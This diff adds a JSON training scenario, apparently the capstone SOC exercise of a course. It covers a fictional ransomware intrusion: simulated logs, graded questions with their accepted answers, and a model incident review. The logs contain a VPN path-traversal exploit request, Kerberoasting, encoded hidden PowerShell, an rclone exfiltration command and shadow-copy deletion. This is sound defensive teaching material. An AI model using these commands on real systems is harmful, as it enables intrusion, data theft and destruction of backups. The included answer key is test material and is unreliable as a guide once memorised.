@@ -1,0 +1,163 @@
+[
+{
+ "id":30,"title":"MASTER SOC INVESTIGATION","domain":"Full Enterprise Incident","tier":"Master Assessment","master":true,
+ "theory":{
+  "concept":"This is the final assessment. A new intrusion is unfolding across Northwind Logistics and you are the lead analyst. Everything the previous twenty-nine cases taught you applies at once: triage, authentication analysis, endpoint and Linux investigation, network and DNS analysis, malware indicators, threat intelligence, persistence hunting, privilege escalation, lateral movement, C2 characterisation, exfiltration quantification, SIEM correlation, ATT&CK mapping, incident response sequencing and forensics. No panel here tells you which events matter.",
+  "why":"A SOC analyst is judged on whether they can carry an incident end to end under time pressure, distinguish the intrusion from the noise around it, and produce a report that survives review by an incident manager, a lawyer and a regulator.",
+  "look":["Work the phases in order but re-read earlier evidence as later phases change its meaning","Every phase contains at least one benign event designed to look malicious","Numbers matter: counts, intervals, volumes and timestamps all go into the report","Controls that worked are findings too"],
+  "fp":["Two of the alerts in the opening queue are not part of this incident","At least one administrative action during the window is authorised and ticketed"],
+  "tips":["Build the timeline as you go rather than at the end","Name the enabling weakness for every stage, not just the technique"]
+ },
+ "case":{"id":"SOC-2026-01000","severity":"CRITICAL","alert":"MASTER ASSESSMENT - Multi-stage enterprise intrusion, lead analyst assignment","host":"Enterprise (multiple)","time":"2026-06-11 to 2026-06-14 UTC","source":"All sources","brief":"Three months after the TA-4411 incident, Northwind Logistics is intruded again by a different actor. You are the lead analyst with no Tier-2 support available until you produce your assessment. Investigate all ten phases, answer every question from evidence, construct the attack timeline, map the techniques, decide severity and containment, and write the full incident report. This assessment is not passed by opening it."},
+ "mitre":"Full chain - to be mapped by the analyst",
+ "evidence":[
+  {"name":"PHASE 1 - Opening Alert Queue (06-11)","rows":[
+   "NW-9901 06-11 03:02 rule=\"VPN appliance: authentication from anomalous ASN\" sev=MEDIUM host=VPN-GW01 user=r.malik src=45.61.202.18 status=NEW",
+   "NW-9902 06-11 03:40 rule=\"Impossible travel\" sev=HIGH user=r.malik locations=\"Karachi PK 21:40 -> Sofia BG 03:40\" status=NEW",
+   "NW-9903 06-11 04:15 rule=\"Disk space below threshold\" sev=LOW host=SRV-PRINT01 status=NEW",
+   "NW-9904 06-11 04:52 rule=\"Kerberos service ticket requests (RC4) burst\" sev=MEDIUM host=DC-02 user=r.malik count=38 status=NEW",
+   "NW-9905 06-11 05:31 rule=\"Credentialed vulnerability scan\" sev=MEDIUM host=multiple src=10.10.9.15 status=NEW (CHG-5120 approved 06-11 05:00-07:00)",
+   "Asset notes: VPN-GW01 = remote access gateway (tier 1) | DC-02 = secondary domain controller (tier 0) | SRV-PRINT01 = print server (tier 3)",
+   "r.malik = Senior Procurement Manager, Karachi. Baseline: PK only, 08:00-19:00 PKT, MFA via authenticator app."
+  ]},
+  {"name":"PHASE 2 - Initial Access (VPN and identity)","rows":[
+   "06-11 03:02:11 VPN-GW01 auth=success user=r.malik src=45.61.202.18 mfa=satisfied method=\"push (approved)\" client_version=\"NWVPN 4.2\" session=SES-77120",
+   "06-11 03:02:11 VPN-GW01 note: appliance firmware 9.1.2 - vendor advisory NWV-2026-004 (auth bypass, patched in 9.1.6) published 06-02, not applied (CHG-5088 deferred)",
+   "06-11 02:58:40 VPN-GW01 4 requests to /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession src=45.61.202.18 status=200",
+   "06-10 21:40:02 VPN-GW01 auth=success user=r.malik src=39.45.112.6 (Karachi ISP) mfa=satisfied session=SES-77044 closed 06-10 22:15",
+   "06-11 03:03:50 identity provider: no MFA prompt recorded for session SES-77120 (session established directly from appliance)",
+   "Infostealer feed (external): credentials for r.malik@northwind-lg.com appeared in a criminal marketplace dump 06-09, source: unmanaged personal device",
+   "06-11 03:05:22 VPN-GW01 session SES-77120 assigned internal IP 10.30.88.41 (VPN pool), full-tunnel access to server VLANs"
+  ]},
+  {"name":"PHASE 3 - Discovery and Execution","rows":[
+   "06-11 03:09:40 SRV-JUMP01 EventID=4624 Account=r.malik LogonType=10 SourceIP=10.30.88.41 (RDP from VPN pool)",
+   "06-11 03:11:02 SRV-JUMP01 4688 parent=mstsc-session child=cmd.exe user=r.malik",
+   "06-11 03:11:44 SRV-JUMP01 4104: Get-ADComputer -Filter * -Properties OperatingSystem | Export-Csv $env:TEMP\\c.csv",
+   "06-11 03:13:20 SRV-JUMP01 4104: Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName",
+   "06-11 03:15:05 SRV-JUMP01 4104: Get-DomainTrust; Get-NetGroupMember -GroupName 'Domain Admins'",
+   "06-11 03:22:10 SRV-JUMP01 file_write C:\\Users\\r.malik\\AppData\\Roaming\\mssync\\msupd.exe sha256=7c3d9e0b4a18ff2265cb01d7e6a49f30bb52c81a7de0349fca6b2e18d70c5a44 signer=none",
+   "06-11 03:22:40 SRV-JUMP01 proc=msupd.exe parent=powershell.exe integrity=Medium",
+   "06-11 09:02:00 SRV-JUMP01 4688 parent=ccmexec.exe child=powershell.exe user=SYSTEM cmd=\"-File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1\" (daily inventory job, CHG standing approval)"
+  ]},
+  {"name":"PHASE 4 - Credential Access","rows":[
+   "06-11 04:52:10 DC-02 EventID=4769 Account=r.malik ServiceName=MSSQLSvc/SRV-SQL02.corp:1433 TicketEncryption=0x17(RC4) SourceIP=10.30.88.41",
+   "06-11 04:52:11-04:54:02 DC-02 EventID=4769 x37 further service tickets, all RC4, ServiceNames include MSSQLSvc, HTTP/, CIFS/, TERMSRV/",
+   "06-11 05:40:33 SRV-JUMP01 4104: Invoke-Kerberoast style ticket export to $env:TEMP\\t.kirbi (file_write confirmed, 38 entries)",
+   "06-11 12:18:02 SRV-JUMP01 EventID=4624 Account=svc_sqlreport LogonType=3 SourceIP=10.30.88.41 (first ever use of this account from a VPN address)",
+   "svc_sqlreport: service account, SPN registered, password last set 2021-03-02, member of 'SQL Report Admins' and local Administrators on SRV-SQL02 and SRV-ERP01",
+   "06-11 11:00:00 DC-02 EventID=4769 Account=svc_sccm ServiceName=CIFS/SRV-APP03 TicketEncryption=0x12(AES256) (routine, daily)"
+  ]},
+  {"name":"PHASE 5 - Privilege Escalation and Persistence","rows":[
+   "06-11 12:31:40 SRV-SQL02 EventID=4624 Account=svc_sqlreport LogonType=3 SourceIP=10.30.88.41 | 12:31:55 EventID=4672 SeDebugPrivilege,SeImpersonatePrivilege",
+   "06-11 12:34:02 SRV-SQL02 proc=msupd.exe user=svc_sqlreport action=process_access target=lsass.exe access=PROCESS_VM_READ signer=none",
+   "06-11 12:40:11 SRV-SQL02 EventID=7045 ServiceName=MsSyncHost BinaryPath=C:\\ProgramData\\mssync\\msupd.exe start=auto",
+   "06-11 12:41:30 SRV-SQL02 schtasks /create /tn \"\\Microsoft\\Windows\\WDI\\SyncHealth\" /tr \"powershell -w hidden -enc <blob>\" /sc onlogon /ru SYSTEM",
+   "06-11 12:44:05 SRV-JUMP01 registry_write HKLM\\SYSTEM\\CurrentControlSet\\Services\\MsSyncHost\\ImagePath = C:\\ProgramData\\mssync\\msupd.exe",
+   "06-11 13:02:19 SRV-ERP01 EventID=4720 TargetAccount=svc_report2 SubjectAccount=svc_sqlreport | 13:02:31 EventID=4732 TargetGroup=Administrators TargetAccount=svc_report2",
+   "06-11 14:10:00 SRV-APP03 EventID=7045 ServiceName=VeeamTransportSvc BinaryPath=\"C:\\Program Files\\Veeam\\...\\VeeamTransport.exe\" signer=\"Veeam Software\" (agent upgrade, CHG-5131)"
+  ]},
+  {"name":"PHASE 6 - Lateral Movement","rows":[
+   "06-11 13:20:02 SRV-SQL02 EventID=4648 Subject=SYSTEM TargetAccount=svc_report2 TargetServer=SRV-ERP01 Process=msupd.exe",
+   "06-11 13:20:09 SRV-ERP01 EventID=4624 Account=svc_report2 LogonType=3 AuthPackage=NTLM SourceIP=10.20.8.31(SRV-SQL02) | 5140 ADMIN$",
+   "06-11 13:21:44 SRV-ERP01 wmiprvse.exe -> cmd.exe /c \"C:\\ProgramData\\mssync\\msupd.exe\" (WMI remote execution)",
+   "06-11 15:02:10 SRV-ERP01 -> SRV-BKP01:445 EventID=4624 Account=svc_report2 LogonType=3 | 5140 ADMIN$ | 7045 MsSyncHost",
+   "06-11 15:40:30 SRV-ERP01 -> SRV-PCI02:445 EventID=4625 Account=svc_report2 SubStatus=0xC000015B x3 (segmented PCI zone, network logon denied)",
+   "06-11 16:12:00 SRV-BKP01 proc=msupd.exe cmd=\"vssadmin list shadows\" then \"Get-VBRJob | Select Name,LastResult\" (backup inventory enumeration)",
+   "06-11 10:30:00 SRV-ERP01 EventID=4624 Account=svc_sccm LogonType=3 SourceIP=10.20.8.40 (daily patch deployment, 84 hosts)"
+  ]},
+  {"name":"PHASE 7 - Command and Control","rows":[
+   "06-11 03:23:10 SRV-JUMP01 -> 45.61.202.44:443 TLS POST /api/v2/telemetry interval=1800s jitter=+/-240s ja3=a0e9f5d64349fb13191bc781f81f42e1 cert=LetsEncrypt CN=metrics-sync-eu.net",
+   "06-11 12:45:00 SRV-SQL02 -> 45.61.202.44:443 same pattern interval=1800s",
+   "06-11 13:25:00 SRV-ERP01 -> 45.61.202.44:443 same pattern interval=1800s",
+   "06-11 15:10:00 SRV-BKP01 -> (no direct route) -> SMB pipe \\\\.\\pipe\\mssync_a1 to SRV-ERP01 every 1800s",
+   "06-12 02:00-06:00 all implants silent (no beacons) | resumed 06-12 06:02",
+   "DNS: metrics-sync-eu.net created 2026-05-28, Cloudflare-fronted, resolves 45.61.202.44; second domain sync-metrics-cdn.net created 2026-05-28 (unused, registered same hour)",
+   "Legitimate comparison: all hosts beacon to 13.107.42.14:443 every 300s (Microsoft telemetry, valid cert, ja3=e7d705a3286e19ea42f587b344ee6865)"
+  ]},
+  {"name":"PHASE 8 - Collection and Exfiltration","rows":[
+   "06-12 09:10:02 SRV-ERP01 proc=msupd.exe file_read \\\\SRV-ERP01\\ERP$\\Exports\\*.csv count=884 total=4.2GB (customer master, pricing, shipment manifests)",
+   "06-12 09:44:20 SRV-ERP01 cmd=\"rclone.exe copy C:\\ProgramData\\mssync\\stage remote:nwx --transfers 8\" (rclone.exe sha256=e9d1... signer=none, dropped 09:40)",
+   "06-12 09:44:20-11:52:40 SRV-ERP01 -> 104.18.32.77:443 (commercial cloud storage provider) bytes_out=3.9GB sustained",
+   "06-12 11:55:02 SRV-ERP01 file_delete C:\\ProgramData\\mssync\\stage\\* (recovered from shadow copy)",
+   "06-12 02:00:14 SRV-FILE02 -> 198.18.44.9:443 bytes_out=408GB rule=FW-BACKUP-07 (nightly DR replication, CHG-1188)",
+   "ERP$ data classification: CONFIDENTIAL - 12,400 customer records including contact details and commercial terms; no cardholder data (PCI zone not reached)"
+  ]},
+  {"name":"PHASE 9 - Impact Preparation","rows":[
+   "06-12 14:02:00 SRV-BKP01 cmd=\"vssadmin delete shadows /all /quiet\" (executed as SYSTEM by msupd.exe)",
+   "06-12 14:03:40 SRV-BKP01 Veeam job 'Daily-Full' modified: retention 30 -> 1, repository credentials changed by svc_report2",
+   "06-12 14:20:10 SRV-ERP01 file_write C:\\ProgramData\\mssync\\lock.exe sha256=3ab77c1d... signer=none (NOT executed - no prefetch entry)",
+   "06-12 14:22:00 GPO 'NW-Workstation-Baseline' modified by svc_report2: added startup script \\\\SRV-ERP01\\netlogon$\\run.bat (script content: copies and runs lock.exe)",
+   "06-12 14:25:44 SRV-ERP01 Security log EventID=1102 log cleared by svc_report2",
+   "06-12 14:31:00 SOC detection: EDR rule 'Shadow copy deletion' fired CRITICAL on SRV-BKP01 - first alert of this incident that was actioned immediately",
+   "06-12 14:52:00 Containment initiated by SOC (this is the point at which you were assigned as lead)"
+  ]},
+  {"name":"PHASE 10 - Response Context and Forensics","rows":[
+   "Memory (SRV-ERP01, captured 15:10): injected RWX region in svchost.exe pid=1420; strings 'remote:nwx', 'metrics-sync-eu.net', rclone config with bearer token; connections 45.61.202.44:443 ESTABLISHED",
+   "Prefetch SRV-ERP01: MSUPD.EXE run_count=22 first=06-11 13:21 | RCLONE.EXE run_count=1 first=06-12 09:44 | LOCK.EXE: no entry",
+   "Shadow copies on SRV-ERP01 survived (deletion was executed on SRV-BKP01 only); staged CSVs recovered",
+   "Controls that worked: PCI segmentation denied svc_report2 (0xC000015B); EDR shadow-copy rule fired and was actioned; SRV-ERP01 shadow copies preserved evidence",
+   "Controls that failed: VPN firmware advisory NWV-2026-004 deferred (CHG-5088); MFA not enforced at identity provider for appliance-established sessions; svc_sqlreport password unchanged since 2021 with SPN registered (kerberoastable); no alert on RC4 ticket burst; no alert on vssadmin until impact stage",
+   "CTI: TTPs (edge appliance auth bypass, kerberoasting, rclone to commercial cloud, vssadmin deletion, GPO-deployed encryptor) match ransomware affiliate cluster TA-7730 (aka HOLLOWREEF). Typical sequence: access -> exfiltration -> encryption within 48-72h. Encryption had NOT yet occurred."
+  ]}
+ ],
+ "questions":[
+  {"id":"m01","label":"PHASE 1 - Which two alerts in the opening queue are NOT part of this incident? (name both IDs)","type":"keywords","accept":["nw-9903","9903","nw-9905","9905"],"hint":"One is a capacity event on a tier-3 asset; one maps to an approved change."},
+  {"id":"m02","label":"PHASE 1 - Which alert should have been ranked highest, and on what basis?","type":"keywords","accept":["nw-9904","9904","kerberos","rc4","dc-02"],"hint":"Consider asset tier and what the rule actually describes happening on a domain controller."},
+  {"id":"m03","label":"PHASE 2 - Attacker source IP","type":"exact","accept":["45.61.202.18"],"hint":"Present on the anomalous VPN authentication and the requests preceding it."},
+  {"id":"m04","label":"PHASE 2 - What vulnerability was exploited on the VPN appliance? (name the advisory)","type":"keywords","accept":["nwv-2026-004","2026-004","auth bypass","authentication bypass"],"hint":"An advisory published on 06-02 was deferred rather than applied."},
+  {"id":"m05","label":"PHASE 2 - What evidence shows the appliance was exploited rather than simply logged into with stolen credentials?","type":"keywords","accept":["traversal","path","/../","request","02:58","200","websession","directory"],"hint":"Look at the four HTTP requests four minutes before the successful authentication."},
+  {"id":"m06","label":"PHASE 2 - Why did the identity provider record no MFA prompt for session SES-77120?","type":"keywords","accept":["appliance","session established","bypass","not enforced","directly","gateway","local"],"hint":"Read the identity provider note and the control-failure list."},
+  {"id":"m07","label":"PHASE 3 - What is the full path of the first-stage implant?","type":"keywords","accept":["msupd.exe","appdata\\roaming\\mssync\\msupd.exe","mssync\\msupd.exe"],"hint":"One unsigned file is written to a roaming profile directory at 03:22."},
+  {"id":"m08","label":"PHASE 3 - Which 09:02 event is legitimate, and why?","type":"keywords","accept":["ccmexec","inventory","sccm","standing approval","system","daily"],"hint":"Compare its parent process and approval status with the attacker activity."},
+  {"id":"m09","label":"PHASE 4 - How many Kerberos service tickets did the attacker request?","type":"num","accept":["38"],"hint":"One ticket at 04:52:10 plus the burst that follows, corroborated by the exported file count."},
+  {"id":"m10","label":"PHASE 4 - Name the credential-access technique","type":"choice","options":["Kerberoasting","Pass-the-hash","DCSync","Golden ticket forgery"],"accept":["kerberoasting"],"hint":"RC4 service tickets requested in bulk for accounts with SPNs, then exported for offline cracking."},
+  {"id":"m11","label":"PHASE 4 - Which service account did the attacker crack and use, and what made it vulnerable?","type":"keywords","accept":["svc_sqlreport","2021","password","old","never changed","spn","weak"],"hint":"One account has an SPN, a password set in 2021, and appears from a VPN address for the first time."},
+  {"id":"m12","label":"PHASE 5 - Name the persistence mechanisms the attacker established (list at least three)","type":"keywords","accept":["service","mssynchost","scheduled task","synchealth","schtasks","registry","imagepath","account","svc_report2","7045"],"hint":"Count across SRV-SQL02, SRV-JUMP01 and SRV-ERP01 - a service, a scheduled task, a registry service entry and a new account."},
+  {"id":"m13","label":"PHASE 5 - Which 7045 service installation is legitimate?","type":"keywords","accept":["veeam","veeamtransportsvc","chg-5131"],"hint":"One service is signed by a vendor and covered by a change record."},
+  {"id":"m14","label":"PHASE 6 - How many hosts did the attacker successfully reach after the jump server?","type":"num","accept":["3"],"hint":"Count SQL02, ERP01 and BKP01 - one further destination was refused."},
+  {"id":"m15","label":"PHASE 6 - Which host refused the movement and what does the sub-status mean?","type":"keywords","accept":["srv-pci02","pci02","logon type not granted","denied","segment","0xc000015b"],"hint":"The same sub-status code you saw in the lateral movement case."},
+  {"id":"m16","label":"PHASE 7 - C2 domain and beacon interval in seconds","type":"keywords","accept":["metrics-sync-eu.net","1800"],"hint":"One destination carries a POST channel at a much longer cadence than the legitimate telemetry."},
+  {"id":"m17","label":"PHASE 7 - What does the 02:00-06:00 silence on 06-12 indicate?","type":"keywords","accept":["working hours","operator","sleep","timezone","human","shift","offline","inactive"],"hint":"Implants with a fixed interval do not stop for four hours on their own."},
+  {"id":"m18","label":"PHASE 8 - What tool was used for exfiltration and how much data left?","type":"keywords","accept":["rclone","3.9gb","3.9"],"hint":"An unsigned utility dropped at 09:40 with a cloud-sync command line."},
+  {"id":"m19","label":"PHASE 8 - Which large transfer in this phase is NOT exfiltration, and why?","type":"keywords","accept":["srv-file02","dr","replication","backup","chg-1188","fw-backup-07","408gb"],"hint":"One 400+ GB transfer has a change record, a fixed window and a contracted destination."},
+  {"id":"m20","label":"PHASE 8 - How many customer records are in scope for notification?","type":"num","accept":["12400","12,400"],"hint":"Read the data classification line."},
+  {"id":"m21","label":"PHASE 9 - What three actions show the attacker was preparing for ransomware deployment?","type":"keywords","accept":["vssadmin","shadow","backup","retention","gpo","lock.exe","startup script","encryptor","delete shadows"],"hint":"Destroy recovery options, weaken backups, and stage a way to run a payload everywhere at once."},
+  {"id":"m22","label":"PHASE 9 - Was the encryption payload executed? State the artefact that proves your answer.","type":"keywords","accept":["no","not executed","no prefetch","prefetch"],"hint":"Check the prefetch evidence for lock.exe in Phase 10."},
+  {"id":"m23","label":"PHASE 9 - What mechanism would have deployed the payload estate-wide?","type":"keywords","accept":["gpo","group policy","startup script","netlogon","run.bat"],"hint":"One modification at 14:22 targets every workstation at once."},
+  {"id":"m24","label":"PHASE 10 - Which actor cluster do the TTPs match?","type":"keywords","accept":["ta-7730","7730","hollowreef"],"hint":"Read the CTI line in Phase 10."},
+  {"id":"m25","label":"PHASE 10 - Name two controls that worked","type":"keywords","accept":["pci","segment","shadow","edr","vssadmin rule","shadow copy","0xc000015b","preserved"],"hint":"The Phase 10 panel lists three."},
+  {"id":"m26","label":"PHASE 10 - Name the single control failure that enabled initial access","type":"keywords","accept":["firmware","patch","nwv-2026-004","deferred","chg-5088","unpatched","vpn"],"hint":"An advisory published nine days before the intrusion was deferred."},
+  {"id":"m27","label":"ATT&CK - Technique ID for the Kerberos ticket abuse","type":"keywords","accept":["t1558.003","t1558"],"hint":"Steal or Forge Kerberos Tickets, Kerberoasting sub-technique."},
+  {"id":"m28","label":"ATT&CK - Technique ID for shadow copy deletion (inhibit system recovery)","type":"keywords","accept":["t1490"],"hint":"Impact tactic, inhibiting recovery."},
+  {"id":"m29","label":"ATT&CK - Technique ID for exfiltration to cloud storage","type":"keywords","accept":["t1567.002","t1567"],"hint":"Exfiltration Over Web Service, cloud storage sub-technique."},
+  {"id":"m30","label":"RESPONSE - What is the first action you order, and why?","type":"keywords","accept":["memory","capture","preserve","volatile","image","evidence"],"hint":"Preservation precedes any action that destroys evidence - and one host is still holding live C2 state in memory."},
+  {"id":"m31","label":"RESPONSE - Which credential must be treated as compromised estate-wide beyond the named accounts?","type":"keywords","accept":["svc_sqlreport","kerberoast","service account","spn","all service accounts","cached"],"hint":"Kerberoasting exported 38 tickets, not one - every account in that export is a candidate."},
+  {"id":"m32","label":"RESPONSE - Why must containment across all four hosts be simultaneous?","type":"keywords","accept":["pipe","relay","adapt","redeploy","internal","channel","warn","burn","react","1800"],"hint":"One host is controlled through an internal pipe relay, and the operator is a human who will react."}
+ ],
+ "report":[
+  {"id":"exec","label":"Executive Summary","min":120,"guide":"What happened, when, business impact, current status - in language an executive can act on."},
+  {"id":"detect","label":"Initial Detection","min":60,"guide":"Which alert first indicated the intrusion, which alert was actually actioned, and the gap between them."},
+  {"id":"timeline","label":"Attack Timeline","min":120,"guide":"Key events in UTC from first access to containment."},
+  {"id":"ioc","label":"Indicators of Compromise","min":80,"guide":"IPs, domains, hashes, file paths, service and task names, account names."},
+  {"id":"users","label":"Affected Users","min":40,"guide":"Compromised and created accounts, plus accounts exposed by kerberoasting."},
+  {"id":"hosts","label":"Affected Hosts","min":40,"guide":"Each host and its role in the intrusion."},
+  {"id":"srcdst","label":"Source / Destination Information","min":40,"guide":"Attacker infrastructure and internal destinations, including the pivot relationships."},
+  {"id":"tech","label":"Attack Techniques","min":80,"guide":"How the attacker achieved each stage."},
+  {"id":"mitre","label":"MITRE ATT&CK Mapping","min":80,"guide":"Tactic and technique IDs for the observed behaviour."},
+  {"id":"evidence","label":"Evidence","min":60,"guide":"Which artefacts support the findings and where they are preserved."},
+  {"id":"root","label":"Root Cause","min":60,"guide":"The specific weakness that enabled initial access, and the ones that enabled escalation."},
+  {"id":"impact","label":"Impact Assessment","min":60,"guide":"Data exposed, record counts, what did not happen and why that matters."},
+  {"id":"contain","label":"Containment","min":60,"guide":"Actions, ordering and why simultaneity matters here."},
+  {"id":"erad","label":"Eradication","min":60,"guide":"Persistence removal, credential invalidation, rebuild decisions."},
+  {"id":"recover","label":"Recovery","min":60,"guide":"Restoration approach, backup integrity considerations, criteria for declaring recovery complete."},
+  {"id":"improve","label":"Detection Improvements","min":80,"guide":"Rules, coverage and process changes that would have caught this earlier."},
+  {"id":"conclusion","label":"Final Analyst Conclusion","min":80,"guide":"Your assessment, confidence level, and residual risk."}
+ ],
+ "decision":"true_positive","severity_answer":"CRITICAL",
+ "recommend":{"any":["isolate","contain","memory","preserve","rotate","krbtgt","simultaneous","coordinated","block","disable"],"text":"Capture memory from all four hosts, then isolate simultaneously; block 45.61.202.44 and both registered domains; disable svc_report2 (preserve, do not delete); rotate every service account exposed by the kerberoast export plus krbtgt; patch VPN-GW01 to 9.1.6; restore backup retention and validate backup integrity; notify legal and privacy for 12,400 customer records."},
+ "timelineKey":["02:58:40","03:02:11","03:09:40","03:22:10","04:52:10","12:18:02","12:40:11","13:20:02","09:44:20","14:02:00","14:31:00"],
+ "hints":["Work phase by phase and resist judging any event until you have read the phase that follows it. Two alerts in the opening queue are noise, one large transfer in Phase 8 is a contracted backup, and one service installation in Phase 5 is a vendor agent.","The single most important judgement in this assessment is what the attacker had NOT yet done. Check the prefetch evidence for the payload in Phase 10, then read what the CTI line says about the actor's typical 48-72 hour sequence."],
+ "review":"TA-7730 (HOLLOWREEF), a ransomware affiliate, entered through VPN-GW01 by exploiting NWV-2026-004 - an authentication bypass patched on 2 June and deferred under CHG-5088. The path traversal requests at 02:58:40 prove exploitation rather than simple credential use, and the identity provider recorded no MFA prompt because sessions established at the appliance never reached it. From the VPN pool the attacker took RDP to SRV-JUMP01, enumerated Active Directory, dropped msupd.exe, and kerberoasted 38 RC4 service tickets from DC-02 - an alert that fired at MEDIUM and was never worked. Cracking svc_sqlreport (SPN registered, password unchanged since 2021) gave local administrator rights on two servers, from which the attacker dumped LSASS, installed service and scheduled-task persistence, created svc_report2, and moved to SRV-ERP01 and the backup server via NTLM and WMI. SRV-PCI02 refused them with 0xC000015B - segmentation held again. C2 ran at 1800 seconds through a Let's Encrypt-certified, Cloudflare-fronted domain registered on 28 May, and the four-hour silence overnight reveals a human operator's working pattern. 3.9 GB of ERP exports (12,400 customer records) left via rclone to commercial cloud storage; the 408 GB DR replication in the same phase is contracted and unrelated. Then the decisive phase: shadow copies deleted on the backup server, Veeam retention cut from 30 days to 1, an encryptor staged as lock.exe, and a GPO startup script prepared to run it on every workstation. Prefetch proves lock.exe never executed. The EDR shadow-copy rule fired CRITICAL and was actioned within minutes - the first alert in this incident to receive an immediate response, and the reason Northwind was contained hours before encryption rather than days after it. Three controls worked; five failed. The organisational finding is the same one as three months ago: detections fired, and nobody owned the action.",
+ "next":"Assessment complete."
+}
+]
